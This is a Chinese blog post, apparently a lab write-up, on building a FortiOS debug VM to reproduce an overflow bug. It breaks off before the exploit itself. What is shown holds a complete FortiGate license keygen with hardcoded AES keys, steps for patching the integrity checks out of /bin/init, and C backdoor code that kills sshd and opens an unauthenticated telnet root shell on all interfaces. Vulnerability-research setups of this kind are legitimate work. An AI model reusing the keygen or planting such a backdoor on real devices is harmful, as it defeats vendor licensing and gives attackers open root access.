<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<meta name="generator" content="Hexo 7.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="&#39;foritos-溢出漏洞复现" class="h-entry article article-type-&#39;foritos" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/07/24/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time class="dt-published" datetime="2024-07-24T06:54:38.000Z" itemprop="datePublished">2024-07-24</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/07/24/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">溢出漏洞复现&#39;</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>获取vm和文件系统</p>
<p><a name="CIKhd"></a></p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>把foritos.ovf导入vmware，默认账户是admin:空</p>
<p><a name="qMAB6"></a></p>
<h2 id="配置网络"><a href="#配置网络" class="headerlink" title="配置网络"></a>配置网络</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">config system interface</span><br><span class="line">edit port1</span><br><span class="line"><span class="built_in">set</span> mode static</span><br><span class="line"><span class="built_in">set</span> ip <span class="number">192.168</span><span class="number">.18</span><span class="number">.99</span> <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">end</span><br><span class="line"><span class="comment">#下面这个配置出网是为了gdbserver连接</span></span><br><span class="line">config router static</span><br><span class="line">edit <span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> device port1</span><br><span class="line"><span class="built_in">set</span> gateway <span class="number">192.168</span><span class="number">.18</span><span class="number">.128</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>然后设置vm的网络适配器<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710504053632-d4c821e8-8b49-4a1f-a9a0-bde228c1f6e1.png#averageHue=%23f1f1f1&clientId=u712b743e-7c20-4&from=paste&height=356&id=u8cdff806&originHeight=534&originWidth=521&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=24246&status=done&style=none&taskId=u6cd9f234-5434-4a95-bec4-35b14971c09&title=&width=347.3333333333333" alt="image.png"><br />最后设置虚拟网络<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710504100048-09b77e31-2867-4d10-87a7-dc1d4d912dc9.png#averageHue=%23ecebeb&clientId=u712b743e-7c20-4&from=paste&height=503&id=u083d12ba&originHeight=754&originWidth=907&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=29099&status=done&style=none&taskId=u4a0024c9-ae0b-4f78-af5b-9d412eeb4bf&title=&width=604.6666666666666" alt="image.png"><br><a name="syKa4"></a></p>
<h2 id="提取vmdk中的文件"><a href="#提取vmdk中的文件" class="headerlink" title="提取vmdk中的文件"></a>提取vmdk中的文件</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/fos/</span><br><span class="line">guestmount -a Fortios.vmdk -m /dev/sda1 --rw /tmp/fos/</span><br><span class="line">mkdir /root/rootfs/</span><br><span class="line">cp /tmp/fos/rootfs.gz /root/rootfs/rootfs.gz</span><br><span class="line">cd /root/rootfs/</span><br><span class="line">gunzip rootfs.gz &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">cat rootfs | cpio -idmv &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">rm rootfs</span><br><span class="line">chroot . sbin/xz -d -k --check=sha256 <span class="built_in">bin</span>.tar.xz &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">chroot . sbin/ftar -xf <span class="built_in">bin</span>.tar &gt; /dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><a name="fj5ho"></a></p>
<h2 id="获取证书"><a href="#获取证书" class="headerlink" title="获取证书"></a>获取证书</h2><p>这个本来是要自己通过ida来获取的，我这里先贴着博客，复现完后再来看看。<br /><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2023/03/02/fortigate_debug_env1/">https://wzt.ac.cn/2023/03/02/fortigate_debug_env1&#x2F;</a><br />证书获取脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">FortiGate keygen v1.1</span></span><br><span class="line"><span class="string">Copyright (C) 2023  CataLpa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="string">it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="string">the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="string">(at your option) any later version.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="string">but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="string">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="string">GNU General Public License for more details.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="string">along with this program.  If not, see &lt;https://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">lic_key_array = &#123;</span><br><span class="line">                    <span class="string">&quot;SERIALNO&quot;</span>:       (<span class="number">0x73</span>, <span class="number">0x0</span>),</span><br><span class="line">                    <span class="string">&quot;CERT&quot;</span>:           (<span class="number">0x73</span>, <span class="number">0x8</span>),</span><br><span class="line">                    <span class="string">&quot;KEY&quot;</span>:            (<span class="number">0X73</span>, <span class="number">0x10</span>),</span><br><span class="line">                    <span class="string">&quot;CERT2&quot;</span>:          (<span class="number">0X73</span>, <span class="number">0x18</span>),</span><br><span class="line">                    <span class="string">&quot;KEY2&quot;</span>:           (<span class="number">0X73</span>, <span class="number">0x20</span>),</span><br><span class="line">                    <span class="string">&quot;CREATEDATE&quot;</span>:     (<span class="number">0x73</span>, <span class="number">0x28</span>),</span><br><span class="line">                    <span class="string">&quot;UUID&quot;</span>:           (<span class="number">0x73</span>, <span class="number">0x30</span>),</span><br><span class="line">                    <span class="string">&quot;CONTRACT&quot;</span>:       (<span class="number">0x73</span>, <span class="number">0x38</span>),</span><br><span class="line">                    <span class="string">&quot;USGFACTORY&quot;</span>:     (<span class="number">0x6e</span>, <span class="number">0x40</span>),</span><br><span class="line">                    <span class="string">&quot;LENCFACTORY&quot;</span>:    (<span class="number">0x6e</span>, <span class="number">0x44</span>),</span><br><span class="line">                    <span class="string">&quot;CARRIERFACTORY&quot;</span>: (<span class="number">0x6e</span>, <span class="number">0x48</span>),</span><br><span class="line">                    <span class="string">&quot;EXPIRY&quot;</span>:         (<span class="number">0x6e</span>, <span class="number">0x4c</span>)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">License</span>:</span><br><span class="line">    fixed_aes_key = <span class="string">b&quot;\x4C\x7A\xD1\x3C\x95\x3E\xB5\xC1\x06\xDA\xFC\xC3\x90\xAE\x3E\xCB&quot;</span></span><br><span class="line">    fixed_aes_iv =  <span class="string">b&quot;\x4C\x7A\xD1\x3C\x95\x3E\xB5\xC1\x06\xDA\xFC\xC3\x90\xAE\x3E\xCB&quot;</span></span><br><span class="line">    fixed_rsa_header = <span class="string">b&quot;\x78\x99\xBF\xA5\xEF\x56\xAA\x98\xC1\x0B\x87\x2E\x30\x8E\x54\xF9\x71\xAD\x13\xEA\xAA\xBC\xE2\x0C\xB3\xAE\x65\xAE\xF9\x0E\x9B\xD1\x88\xC7\xFE\xBC\x86\x65\xFE\xE7\x62\xDE\x43\x0B\x02\x15\x36\xC8\xC5\xCD\x0E\xB9\x01\x97\xCE\x82\x27\x0F\x69\x7F\x6A\x29\xEC\x1C&quot;</span></span><br><span class="line">    </span><br><span class="line">    rsa_header_length = <span class="built_in">len</span>(fixed_rsa_header)    <span class="comment"># 4 bytes</span></span><br><span class="line">    aes_key = fixed_aes_iv + fixed_aes_key       <span class="comment"># 32 bytes  iv + key</span></span><br><span class="line">    enc_data_length = <span class="literal">None</span></span><br><span class="line">    enc_data = <span class="literal">None</span></span><br><span class="line">    license_data = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    license_header = <span class="string">&quot;-----BEGIN FGT VM LICENSE-----\r\n&quot;</span></span><br><span class="line">    license_tail = <span class="string">&quot;-----END FGT VM LICENSE-----\r\n&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, licensedata</span>):</span><br><span class="line">        <span class="variable language_">self</span>.license_data = licensedata</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_data</span>(<span class="params">self</span>):</span><br><span class="line">        tmp_buf = <span class="string">b&quot;\x00&quot;</span> * <span class="number">4</span> + struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x13A38693</span>) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">4</span> + <span class="variable language_">self</span>.license_data   <span class="comment"># append magic number</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, password, iv</span>):</span><br><span class="line">            bs = <span class="number">16</span></span><br><span class="line">            pad = <span class="keyword">lambda</span> s: s + (bs - <span class="built_in">len</span>(s) % bs) * <span class="built_in">chr</span>(bs - <span class="built_in">len</span>(s) % bs).encode()</span><br><span class="line">            cipher = AES.new(password, AES.MODE_CBC, iv)</span><br><span class="line">            data = cipher.encrypt(pad(data))</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.enc_data = encrypt(tmp_buf, <span class="variable language_">self</span>.aes_key[<span class="number">16</span>:], <span class="variable language_">self</span>.aes_key[:<span class="number">16</span>])</span><br><span class="line">        <span class="variable language_">self</span>.enc_data_length = <span class="built_in">len</span>(<span class="variable language_">self</span>.enc_data)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">obj_to_license</span>(<span class="params">self</span>):</span><br><span class="line">        buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">        buf += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="variable language_">self</span>.rsa_header_length)</span><br><span class="line">        buf += <span class="variable language_">self</span>.fixed_rsa_header</span><br><span class="line">        buf += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="variable language_">self</span>.enc_data_length)</span><br><span class="line">        buf += <span class="variable language_">self</span>.enc_data</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LicenseDataBlock</span>:</span><br><span class="line">    key_name_length = <span class="literal">None</span>    <span class="comment"># 1 byte</span></span><br><span class="line">    key_name = <span class="literal">None</span></span><br><span class="line">    key_flag = <span class="literal">None</span>           <span class="comment"># 1 byte, &#x27;s&#x27; for str or &#x27;n&#x27; for num</span></span><br><span class="line">    key_value_length = <span class="literal">None</span>   <span class="comment"># 2 bytes</span></span><br><span class="line">    key_value = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, keyname, keyvalue</span>):</span><br><span class="line">        <span class="variable language_">self</span>.key_name_length = <span class="built_in">len</span>(keyname)</span><br><span class="line">        <span class="variable language_">self</span>.key_name = keyname</span><br><span class="line">        <span class="variable language_">self</span>.key_value_length = <span class="built_in">len</span>(keyvalue)</span><br><span class="line">        <span class="variable language_">self</span>.key_value = keyvalue</span><br><span class="line">        <span class="variable language_">self</span>.key_flag = lic_key_array.get(keyname)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">obj_to_bin</span>(<span class="params">self</span>):</span><br><span class="line">        buf = <span class="string">b&quot;&quot;</span></span><br><span class="line">        buf += struct.pack(<span class="string">&quot;&lt;B&quot;</span>, <span class="variable language_">self</span>.key_name_length)</span><br><span class="line">        buf += <span class="variable language_">self</span>.key_name.encode()</span><br><span class="line">        buf += struct.pack(<span class="string">&quot;&lt;B&quot;</span>, <span class="variable language_">self</span>.key_flag)</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.key_flag == <span class="number">0x73</span>:</span><br><span class="line">            buf += struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="variable language_">self</span>.key_value_length)</span><br><span class="line">            buf += <span class="variable language_">self</span>.key_value.encode()</span><br><span class="line">        <span class="keyword">elif</span> <span class="variable language_">self</span>.key_flag == <span class="number">0x6e</span>:</span><br><span class="line">            buf += struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="number">4</span>)</span><br><span class="line">            buf += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">int</span>(<span class="variable language_">self</span>.key_value))</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    license_data_list = [</span><br><span class="line">                            LicenseDataBlock(<span class="string">&quot;SERIALNO&quot;</span>, <span class="string">&quot;FGVMPGLICENSEDTOCATALPA&quot;</span>),</span><br><span class="line">                            LicenseDataBlock(<span class="string">&quot;CREATEDATE&quot;</span>, <span class="string">&quot;1696089600&quot;</span>),</span><br><span class="line">                            LicenseDataBlock(<span class="string">&quot;USGFACTORY&quot;</span>, <span class="string">&quot;0&quot;</span>),</span><br><span class="line">                            LicenseDataBlock(<span class="string">&quot;LENCFACTORY&quot;</span>, <span class="string">&quot;0&quot;</span>),</span><br><span class="line">                            LicenseDataBlock(<span class="string">&quot;CARRIERFACTORY&quot;</span>, <span class="string">&quot;0&quot;</span>),</span><br><span class="line">                            LicenseDataBlock(<span class="string">&quot;EXPIRY&quot;</span>, <span class="string">&quot;31536000&quot;</span>),</span><br><span class="line">                        ]</span><br><span class="line">    license_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> license_data_list:</span><br><span class="line">        license_data += obj.obj_to_bin()</span><br><span class="line"></span><br><span class="line">    _lic = License(license_data)</span><br><span class="line">    _lic.encrypt_data()</span><br><span class="line">    raw_license = _lic.obj_to_license().decode()</span><br><span class="line">    </span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    lic = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> n &gt;= <span class="built_in">len</span>(raw_license):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lic += raw_license[n:n + <span class="number">64</span>]</span><br><span class="line">        lic += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">        n += <span class="number">64</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./License.lic&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(_lic.license_header + lic + _lic.license_tail)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Saved to ./License.lic&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接运行就会生成证书文件直接上传就行。<br><a name="aZBiU"></a></p>
<h2 id="配置网络环境和port2"><a href="#配置网络环境和port2" class="headerlink" title="配置网络环境和port2"></a>配置网络环境和port2</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710503793227-16f8f838-eb99-4005-9167-f74a235a105a.png#averageHue=%23dedddc&clientId=u712b743e-7c20-4&from=paste&height=690&id=u274f9a15&originHeight=1035&originWidth=2435&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=100367&status=done&style=none&taskId=u736819fe-f8e7-4a4d-854a-9532e3be9a9&title=&width=1623.3333333333333" alt="image.png"><br />进入后<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710504173037-f01c958b-3b1a-43e3-91be-ecf321ff271a.png#averageHue=%23f8f6f3&clientId=u712b743e-7c20-4&from=paste&height=658&id=ud2f31bc2&originHeight=987&originWidth=1228&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=27587&status=done&style=none&taskId=ua7a80e41-008c-44b5-8039-9dce6eb7b49&title=&width=818.6666666666666" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710504191864-cf7036b8-c52f-486e-8f37-20c7885e620d.png#averageHue=%23f9f6f4&clientId=u712b743e-7c20-4&from=paste&height=167&id=u24103d59&originHeight=250&originWidth=999&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=5523&status=done&style=none&taskId=u50bf3d90-83f9-4487-9053-5262ec5f957&title=&width=666" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710504209511-7b057934-8abc-4c9f-b61d-5392db889255.png#averageHue=%23f5eeee&clientId=u712b743e-7c20-4&from=paste&height=91&id=u12c6a694&originHeight=137&originWidth=718&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=2671&status=done&style=none&taskId=u700d0738-606b-4fc6-a1da-786e212943c&title=&width=478.6666666666667" alt="image.png"></p>
<p>然后点击应用</p>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710937830023-bd5af0af-67bd-4db4-b3e2-c584ef167571.png#averageHue=%23d4d4d4&clientId=u367e3090-40f7-4&from=paste&height=752&id=uc316e7c5&originHeight=1128&originWidth=1999&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=84193&status=done&style=none&taskId=u0e863ebf-28b1-40e6-96de-25c9746eeaa&title=&width=1332.6666666666667" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710937816352-aa9c3d37-b16a-483a-ac1c-abd91756e383.png#averageHue=%23cdcccc&clientId=u367e3090-40f7-4&from=paste&height=739&id=u72a57459&originHeight=1108&originWidth=1809&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=74374&status=done&style=none&taskId=ud67421ae-6d59-432e-bc45-6dc5ea2878b&title=&width=1206" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710937849565-d1192681-fc25-4300-aa45-10f0c111c22e.png#averageHue=%23d5d3d1&clientId=u367e3090-40f7-4&from=paste&height=757&id=u732ca622&originHeight=1135&originWidth=2141&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=96132&status=done&style=none&taskId=uda901d4b-459f-4295-8248-9485a4092c2&title=&width=1427.3333333333333" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710937858413-56696aaa-9b39-4bca-9c0e-2367175a1858.png#averageHue=%23cdcccc&clientId=u367e3090-40f7-4&from=paste&height=803&id=uec5f0db0&originHeight=1204&originWidth=1889&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=152166&status=done&style=none&taskId=uf7c2e789-41d3-4c84-9d6d-026aee88e5c&title=&width=1259.3333333333333" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710937884201-a443e877-9e37-4866-a4c0-ef4a152aba7e.png#averageHue=%23d7d6d6&clientId=u367e3090-40f7-4&from=paste&height=764&id=u7aa5b9df&originHeight=1146&originWidth=2168&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=111423&status=done&style=none&taskId=u6876e4cf-0618-4e50-bc25-172703f5d7f&title=&width=1445.3333333333333" alt="image.png"></p>
<p>好了！</p>
<p><a name="pcv7S"></a></p>
<h1 id="注入后门启动调试"><a href="#注入后门启动调试" class="headerlink" title="注入后门启动调试"></a>注入后门启动调试</h1><p><a name="zvQx1"></a></p>
<h2 id="patch文件init"><a href="#patch文件init" class="headerlink" title="patch文件init"></a>patch文件init</h2><p>文件：&#x2F;bin&#x2F;init<br />在main函数中有几处文件校验，校验不通过会调用dl_halt函数重启vm<br />patch前<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710773925395-a62d1a23-67d4-41e3-8791-4f677e882e64.png#averageHue=%23fdfdfd&clientId=u99ef5484-7635-4&from=paste&height=401&id=u3c55f532&originHeight=602&originWidth=1043&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=48603&status=done&style=none&taskId=u7e384493-6db9-47c0-9d97-b88674e5f77&title=&width=695.3333333333334" alt="image.png"><br />patch后<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/35802705/1710773946281-2916302d-2e21-490e-ae36-9e1898e09b18.png#averageHue=%23fefefe&clientId=u99ef5484-7635-4&from=paste&height=435&id=ub0ab9c2d&originHeight=652&originWidth=901&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=46440&status=done&style=none&taskId=ue04010a4-e440-4863-84dd-d0465eb6574&title=&width=600.6666666666666" alt="image.png"><br />把dl_halt的跳转patch掉就行。</p>
<p><a name="QF7G2"></a></p>
<h2 id="注入后门和gdbserver"><a href="#注入后门和gdbserver" class="headerlink" title="注入后门和gdbserver"></a>注入后门和gdbserver</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">//gcc -g shell.c -static -o shellcode</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> tcp_port = <span class="number">22</span>;</span><br><span class="line"></span><br><span class="line">void shell() &#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/busybox ls&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/busybox id&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  system(</span><br><span class="line">      <span class="string">&quot;/bin/busybox killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 &quot;</span></span><br><span class="line">      <span class="string">&quot;-p 22&quot;</span>,</span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/busybox sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char const *argv[]) &#123;</span><br><span class="line">  shell();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里开了两种连shell的方式这样方便后面调试。</p>
<p>然后把虚拟机foritos的vmdk挂载到ubuntu16上，就可以对磁盘进行修改了（踩了无数坑才想到的呜呜呜）</p>
<p><a name="xLtWV"></a></p>
<h3 id="rootfs-gz打包工具"><a href="#rootfs-gz打包工具" class="headerlink" title="rootfs.gz打包工具"></a>rootfs.gz打包工具</h3><p><a target="_blank" rel="noopener" href="https://github.com/rrrrrrri/fgt-auto-repack">https://github.com/rrrrrrri/fgt-auto-repack</a><br />这个python只能传shell和busybox<br /><strong>修改版</strong></p>
